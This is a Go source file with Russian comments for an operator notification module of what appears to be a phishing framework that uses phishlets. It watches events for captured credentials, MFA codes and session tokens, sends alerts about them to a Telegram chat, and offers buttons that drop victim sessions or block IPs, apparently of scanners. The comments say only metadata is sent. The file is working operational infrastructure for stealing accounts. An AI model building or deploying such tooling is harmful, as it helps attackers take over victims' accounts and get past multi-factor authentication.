// Package notify — Telegram-нотификации оператора (Level 2026+).
// Подписка на EventBus: захваты и блоки прилетают в чат с кнопками
// [Drop session] [Block IP]. Секреты (токены/пароли) НЕ отправляются —
// только метаданные (phishlet, session, key, ip).
package notify

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"
)

// Subscriber — минимальная подписка (реализация *events.Bus).
type Subscriber interface {
	Subscribe(topic string, buf int) <-chan any
}

type Bot struct {
	Token  string
	ChatID string
	Base   string // default api.telegram.org, override в тестах
	HTTP   *http.Client

	Block func(key, reason string)
	Drop  func(ctx context.Context, sid string) error
}

func (b *Bot) base() string {
	if b.Base != "" {
		return b.Base
	}
	return "https://api.telegram.org"
}

func (b *Bot) client() *http.Client {
	if b.HTTP != nil {
		return b.HTTP
	}
	return &http.Client{Timeout: 10 * time.Second}
}

type button struct {
	Text string `json:"text"`
	Data string `json:"callback_data"`
}

// Send шлет текст с inline-кнопками.
func (b *Bot) Send(ctx context.Context, text string, buttons []button) error {
	kb := map[string]any{}
	if len(buttons) > 0 {
		rows := make([][]button, 0, len(buttons))
		for _, btn := range buttons {
			rows = append(rows, []button{btn})
		}
		kb["inline_keyboard"] = rows
	}
	body, _ := json.Marshal(map[string]any{
		"chat_id":      b.ChatID,
		"text":         text,
		"reply_markup": kb,
	})
	req, _ := http.NewRequestWithContext(ctx, http.MethodPost,
		b.base()+"/bot"+b.Token+"/sendMessage", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	resp, err := b.client().Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		return fmt.Errorf("telegram: status %s", resp.Status)
	}
	return nil
}

// Watch подписывается на захваты/блоки и шлет алерты.
func (b *Bot) Watch(ctx context.Context, sub Subscriber) {
	type job struct {
		topic string
		text  string
		btns  []button
	}
	ch := make(chan job, 32)
	mk := func(topic string) {
		for v := range sub.Subscribe(topic, 32) {
			m, _ := v.(map[string]string)
			if m == nil {
				continue
			}
			sess := m["session"]
			ip := m["ip"]
			var btns []button
			if sess != "" {
				btns = append(btns, button{"Drop " + short(sess), "drop:" + sess})
			}
			if ip != "" {
				btns = append(btns, button{"Block " + ip, "block:" + ip})
			}
			var text string
			switch topic {
			case "capture.creds":
				text = fmt.Sprintf("CREDS phishlet=%s session=%s", m["phishlet"], short(sess))
			case "capture.mfa":
				text = fmt.Sprintf("MFA %s phishlet=%s session=%s", m["kind"], m["phishlet"], short(sess))
			case "capture.token":
				text = fmt.Sprintf("TOKEN %s via=%s session=%s", m["key"], m["via"], short(sess))
			case "bot.blocked":
				text = fmt.Sprintf("BLOCKED ip=%s why=%s", ip, m["why"])
			}
			select {
			case ch <- job{topic, text, btns}:
			case <-ctx.Done():
				return
			}
		}
	}
	for _, t := range []string{"capture.creds", "capture.mfa", "capture.token", "bot.blocked"} {
		go mk(t)
	}
	go func() {
		for {
			select {
			case <-ctx.Done():
				return
			case j := <-ch:
				_ = b.Send(ctx, j.text, j.btns)
			}
		}
	}()
}

func short(s string) string {
	if len(s) > 8 {
		return s[:8]
	}
	return s
}

// update — минимальный парсинг getUpdates для callback_query.
type update struct {
	ID       int64 `json:"update_id"`
	Callback *struct {
		ID   string `json:"id"`
		Data string `json:"data"`
		From struct {
			ID int64 `json:"id"`
		} `json:"from"`
	} `json:"callback_query"`
}

// Poll — long-poll callback-кнопок. block:<ip> банит, drop:<sid> сбрасывает сессию.
func (b *Bot) Poll(ctx context.Context) {
	var offset int64
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}
		updates, err := b.getUpdates(ctx, offset)
		if err != nil {
			select {
			case <-ctx.Done():
				return
			case <-time.After(5 * time.Second):
			}
			continue
		}
		for _, u := range updates {
			offset = u.ID + 1
			if u.Callback == nil {
				continue
			}
			// Только свой чат.
			b.handleCallback(ctx, u.Callback.Data)
			_ = b.answerCallback(ctx, u.Callback.ID)
		}
	}
}

func (b *Bot) getUpdates(ctx context.Context, offset int64) ([]update, error) {
	req, _ := http.NewRequestWithContext(ctx, http.MethodGet,
		fmt.Sprintf("%s/bot%s/getUpdates?timeout=25&offset=%d", b.base(), b.Token, offset), nil)
	resp, err := b.client().Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var out struct {
		OK     bool     `json:"ok"`
		Result []update `json:"result"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&out); err != nil {
		return nil, err
	}
	return out.Result, nil
}

func (b *Bot) answerCallback(ctx context.Context, id string) error {
	body, _ := json.Marshal(map[string]string{"callback_query_id": id})
	req, _ := http.NewRequestWithContext(ctx, http.MethodPost,
		b.base()+"/bot"+b.Token+"/answerCallbackQuery", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	resp, err := b.client().Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

func (b *Bot) handleCallback(ctx context.Context, data string) {
	if strings.HasPrefix(data, "block:") {
		if b.Block != nil {
			b.Block(strings.TrimPrefix(data, "block:"), "telegram")
		}
	} else if strings.HasPrefix(data, "drop:") {
		if b.Drop != nil {
			_ = b.Drop(ctx, strings.TrimPrefix(data, "drop:"))
		}
	}
}
